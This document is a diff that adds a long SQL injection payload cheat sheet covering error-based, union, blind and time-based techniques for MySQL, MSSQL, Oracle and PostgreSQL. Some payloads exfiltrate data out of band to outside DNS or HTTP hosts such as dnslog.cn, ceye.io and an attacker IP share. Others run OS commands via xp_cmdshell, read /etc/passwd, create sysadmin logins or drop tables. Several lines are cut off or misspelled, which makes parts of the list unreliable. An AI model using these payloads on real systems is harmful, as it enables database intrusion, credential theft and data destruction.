@@ -23,3 +23,211 @@ uname=admin&passwd=' or updatexml(1,concat(0x7e,(select username from (select us
 ' and if((select count([column_name]) from [sheet_name])=5, 1=1, 1=2) %23
 ' and if(length((select count([column_name]) from [sheet_name]))=5, 1=1, 1=2) %23
 ' and if(ascii(mid((select count([column_name]) from [sheet_name]), 1, 1))=101, 1=1, 1=2) %23
+?id=1' and extractvalue(1, concat(0x7e,(select @@version),0x7e))--+
+?id=1' and extractvalue(1, concat(0x7e,(select @@version_compile_os),0x7e))--+
+?id=1' union select 1,count(),concat(0x7e,(select database()),0x7e,floor(rand(0)2))a from information_schema.schemata group by a--+
+?id=1' union select 1,count(),concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+
+?id=1' and if(left(database(),1)='s',sleep(10),1) --+
+?id=1' and if(left(database(),2)='sa',sleep(10),1) --+
+?id=1' and left(database(),1)='s' --+
+?id=1' and left(database(),2) > 'sa' --+
+?id=1' and (select table_name from information_schema.tables where table_schema=database() limit 0,1)like 'e%'--+
+and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=115--+
+?id=1'; insert into users(id,username,password) values(88,'aaa','bbb')#
+?id=-1';show columns from 1919810931114514%23
+?id=1';show tables%23
+?id=1' order by 3%23
+?id=1' and (select load_file(concat('\\',(select hex(user())),'.http://682y4b.dnslog.cn/abc'))) --+
+?id=%df' and 1=1 --+
+?id=-1%df' union select 1,2,3 %23
+select(user())from dual where(1=1)and(2=2)
+?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23
+union select * from (select 1)a join (select 2)b
+select substr(database() from 1 for 1);
+select mid(database() from 1 for 1);
+select ascii(mid(user(),1,1))=80 #
+select user() like 'r%'
+select * from users where id=1 and ascii(substr(database(),0,1))>64
+select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
+index.php?id=1%27/**/and%201=2/**/--+
+index.php?id=1'%0Aand%0C1=2%09--+
+index.php?id=1%27%0dand%201=1--+
+index.php?id=1%27%09and%201=1--+
+index.php?id=-1 /*!union/**/select/**/1,2,database/**/()*/
+?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23
+?id=-2%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=0x74657374
+select mid(database() from 1 for 1);
+union select * from (select 1)a join (select 2)b
+select ascii(mid(user(),1,1))=80
+select * from news limit 1 offset 0
+select * from users where id=1 and greatest(ascii(substr(database(),0,1)，64)=64
+?id=-1 union select 1,2,3 ||’
+?id=-1 union select 1,2,’3
+SELECT * FROM users WHERE name LIKE 'J___';
+SELECT * FROM users WHERE name LIKE '%John%';
+SELECT * FROM users WHERE name REGEXP '^[A-Z].*';
+SELECT * FROM users WHERE name REGEXP '[0-9]+';
+' or sleep(5)#
+;waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+' or benchmark(10000000,MD5(1))#
+" or pg_sleep(5)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+1' order by 1#
+1' order by 100#
+-1' union select 1,2,3# 
+-1' union select 1,database(),3#
+-1' union select 1,database(),3 from information_schema.tables#
+-1' union select 1,version(),3#
+-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='db_name'#
+-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='db_name' and table_name='sheet_name'#
+-1' union select 1,group_concat(column1,0x3a,column2),3 from db_name.column#
+1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)# 
+1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='db_name' limit 0,1),0x7e),1)# 
+1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='db_name' and table_name='sheet_name' limit 0,1),0x7e),1)# 
+1' and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1)#
+1' and exp(~(select * from (select user())a))# 
+1' and exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)a))#
+1' and exp(~(select * from (select column_name from information_schema.columns where table_name='sheet_name' limit 0,1)a))# 
+1' and exp(~(select * from(select 'column_name' from 'sheet_name' limit 0,1)))# 
+1' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)#
+1';show databases;# 
+1';show tables;# 
+1';show columns from `table_name`;
+1';RENAME TABLE `table1` TO `table2`;RENAME TABLE `table3` TO `table1`;ALTER TABLE `table1` CHANGE `l1` `l2` VARCHAR(100) ;show columns from table1;# 
+1';HANDLER table_name OPEN;HANDLER table_name READ FIRST;HANDLER table_name CLOSE;# 
+1;set sql_mode=PIPES_AS_CONCAT;select 1
+1' and (sleep(5))--+
+1' and if(length(database())=8,sleep(5),1)--+
+1' and if(ascii(substr(database(),2,1))=101,sleep(5),1)--+
+1' and if((select count(table_name) from information_schema.tables where table_schema="aaa")=4,sleep(2),0)--+
+1'and if(ascii(substr((select table_name from information_schema.tables where table_schema='aaa' limit 3,1),3,1))=101,sleep(3),1)--+
+1' and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name="users" limit 1,1),1,1))=117,sleep(5),1)--+
+1' and if(length((select column_name from information_schema.columns where table_schema="aaa" and table_name="bbb" limit 0,1))=8,sleep(5),1)--+
+1' and if(ascii(substr((select 列名 from 表名 limit 0,1),1,1))=68,sleep(5),1)--+
+1' and select 1 from dual where 1=0 or DBMS_PIPE.RECEIVE_MESSAGE('Macr0phag3', REPLACE((SELECT substr(user, 1, 1) FROM dual), 'A', 1))=1;
+1' and select 1 from dual where 1=0 or DBMS_PIPE.RECEIVE_MESSAGE('Macr0phag3', REPLACE((SELECT substr(user, 1, 1) FROM dual), 'S', 1))=1;
+1' AND (SELECT UTL_INADDR.GET_HOST_NAME((SELECT USER FROM DUAL)) FROM DUAL) IS NOT NULL --
+1' AND select CTXSYS.CTX_REPORT.TOKEN_TYPE((select user from dual), '123') from dual;
+1' AND select ctxsys.drithsx.sn(1, (select user from dual)) from dual;
+1' AND select CTXSYS.CTX_REPORT.TOKEN_TYPE((select user from dual), '123') from dual;
+1' AND select XMLType('<:'||(select user from dual)||'>') from dual;
+1' AND select dbms_xdb_version.checkin((select user from dual)) from dual;
+1' AND select dbms_xdb_version.makeversioned((select user from dual)) from dual;
+1' AND select dbms_xdb_version.uncheckout((select user from dual)) from dual;
+1' AND SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual;
+1' AND select ordsys.ord_dicom.getmappingxpath((select user from dual), 1, 1) from dual;
+1' AND select UTL_INADDR.get_host_name((select user from dual)) from dual;
+1' AND select UTL_INADDR.get_host_name('~'||(select user from dual)||'~') from dual;
+1' AND SELECT DBMS_LDAP.INIT((‘oob.dnsattacker.com',80) FROM DUAL;
+1' AND SELECT HTTPURITYPE((select user from dual)||'.xx.nk40ci.ceye.io').GETCLOB() FROM DUAL;
+select @@version
+select @@servernamee
+select @@microsoftversione
+select * from master..sysserverse
+select * from sysusers
+exec master..xp_cmdshell 'ipconfig+/all'	
+exec master..xp_cmdshell 'net+view'
+exec master..xp_cmdshell 'net+users'
+exec master..xp_cmdshell 'ping+<attackerip>'
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspâ'" select * from myfile"--
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+'create user name identified by 'pass123' --
+'create user name identified by pass123 temporary tablespace temp default tablespace users; 
+' ; drop table temp --
+'exec sp_addlogin 'name' , 'password' --
+' exec sp_addsrvrolemember 'name' , 'sysadmin' --
+' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --
+' grant connect to name; grant resource to name; --
+' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+' union (select @@version) --
+' union (select NULL, (select @@version)) --
+' union (select NULL, NULL, (select @@version)) --
+' union (select NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
+1' and 1=(select count(*) from tablenames); --
+; execute immediate 'sel' || 'ect us' || 'er'
+benchmark(10000000,MD5(1))#
+";waitfor delay '0:0:__TIME__'--
+1) or pg_sleep(__TIME__)--
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+" or sleep(__TIME__)#
+pg_sleep(__TIME__)--
+declare @q nvarchar (200) 0x730065006c00650063 ...
+1) or sleep(__TIME__)#
+; exec xp_regread
+@var select @var as var into temp end --
+1)) or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+1 waitfor delay '0:0:10'--
+ UNION ALL SELECT
+) or sleep(__TIME__)='
+)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+));waitfor delay '0:0:__TIME__'--
+a' waitfor delay '0:0:10'--
+1;(load_file(char(47,101,116,99,47,112,97,115, ...
+1 or sleep(__TIME__)#
+ and 1 in (select var from temp)--
+declare @s varchar (200) select @s = 0x73656c6 ...
+; exec master..xp_cmdshell 'ping 172.10.1.255'--
+" or pg_sleep(__TIME__)--
+1) or benchmark(10000000,MD5(1))#
+\x27UNION SELECT
+declare @s varchar(200) select @s = 0x77616974 ...
+"));waitfor delay '0:0:__TIME__'--
+) union select * from information_schema.tables;
+1)) or pg_sleep(__TIME__)--
+ union all select @@version--
+t'exec master..xp_cmdshell 'nslookup www.googl ...
+%20$(sleep%2050)
+1 or benchmark(10000000,MD5(1))#
+ or pg_sleep(__TIME__)--
+") or sleep(__TIME__)="
+; begin declare @var varchar(8000) set @var=' ...
+ union select 1,load_file('/etc/passwd'),1,1,1;
+) or pg_sleep(__TIME__)--
+ union select
+ or sleep(__TIME__)#
+ select * from information_schema.tables--
+declare @s varchar(22) select @s =
+ or sleep(__TIME__)='
+declare @s varchar (8000) select @s = 0x73656c ...
+) or benchmark(10000000,MD5(1))#
+ or username like char(37);
+;waitfor delay '0:0:__TIME__'--
+ (select top 1
+ or benchmark(10000000,MD5(1))#
+");waitfor delay '0:0:__TIME__'--
+ group by userid having 1=1--
+ ; exec master..xp_cmdshell
+")) or sleep(__TIME__)="
+") or pg_sleep(__TIME__)--
+)) or pg_sleep(__TIME__)--
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+declare @q nvarchar (200) select @q = 0x770061 ...
+; exec ('sel' + 'ect us' + 'er')
+declare @q nvarchar (4000) select @q =
+1)) or sleep(__TIME__)#
+ select name from syscolumns where id = (sele ...
+);waitfor delay '0:0:__TIME__'--
+") or benchmark(10000000,MD5(1))#
+)) or sleep(__TIME__)='
+ or 1 in (select @@version)--
+ union select * from users where login = char ...
+")) or pg_sleep(__TIME__)--
+declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) 
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+'; exec master..xp_cmdshell
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+' UNION SELECT
+' UNION ALL SELECT
+' (select top 1
